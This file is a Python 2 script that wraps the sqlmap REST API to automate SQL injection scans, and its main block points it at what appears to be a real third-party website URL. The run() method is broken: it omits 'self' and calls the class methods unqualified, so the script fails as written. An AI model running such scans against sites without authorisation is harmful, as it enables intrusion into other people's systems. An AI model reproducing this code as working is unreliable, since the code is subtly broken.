#!/usr/bin/python
#-*-coding:utf-8-*-
import requests
import time
import json
import threading


class autoSqli(threading.Thread):

    def __init__(self, server='', target='',data = '',referer = '',cookie = ''):
        threading.Thread.__init__(self)
        self.server = server
        if self.server[-1] != '/':
            self.server = self.server + '/'
        self.target = target
        self.taskid = ''
        self.engineid = ''
        self.status = ''
        self.data = data
        self.referer = referer
        self.cookie = cookie
        self.start_time = time.time()

    def task_new(self):
        self.taskid = json.loads(
            requests.get(self.server + 'task/new').text)['taskid']
        print 'Created new task: ' + self.taskid
        if len(self.taskid) > 0:
            return True
        return False

    def task_delete(self):
        if json.loads(requests.get(self.server + 'task/' + self.taskid + '/delete').text)['success']:
            print '[%s] Deleted task' % (self.taskid)
            return True
        return False

    def scan_start(self):
        headers = {'Content-Type': 'application/json'}
        payload = {'url': self.target}
        url = self.server + 'scan/' + self.taskid + '/start'
        t = json.loads(
            requests.post(url, data=json.dumps(payload), headers=headers).text)
        self.engineid = t['engineid']
        if len(str(self.engineid)) > 0 and t['success']:
            print 'Started scan'
            return True
        return False

    def scan_status(self):
        self.status = json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/status').text)['status']
        if self.status == 'running':
            return 'running'
        elif self.status == 'terminated':
            return 'terminated'
        else:
            return 'error'

    def scan_data(self):
        self.data = json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/data').text)['data']
        if len(self.data) == 0:
            print 'not injection:\t'
        else:
            print 'injection:\t' + self.target

    def option_set(self):
        headers = {'Content-Type': 'application/json'}
        option = {"smart": True,
                  "threads": 4 
                }
        url = self.server + 'option/' + self.taskid + '/set'
        t = json.loads(
            requests.post(url, data=json.dumps(option), headers=headers).text)
        print t

    def scan_stop(self):
        json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/stop').text)['success']

    def scan_kill(self):
        json.loads(
            requests.get(self.server + 'scan/' + self.taskid + '/kill').text)['success']

    def run(server='', target='',data = '',referer = '',cookie = ''):
        if server[-1] != '/':
            server = self.server + '/'
        if not task_new():
            return False
        option_set()
        if not scan_start():
            return False
        while True:
            if scan_status() == 'running':
                time.sleep(10)
            elif scan_status() == 'terminated':
                break
            else:
                break
            print time.time() - self.start_time
            if time.time() - self.start_time > 3000:
                error = True
                self.scan_stop()
                self.scan_kill()
                break
        self.scan_data()
        self.task_delete()
        print time.time() - self.start_time

if __name__ == '__main__':
    t = autoSqli('http://127.0.0.1:8775', 'http://www.tjculture.com/read.php?id=169604')
    t.run()
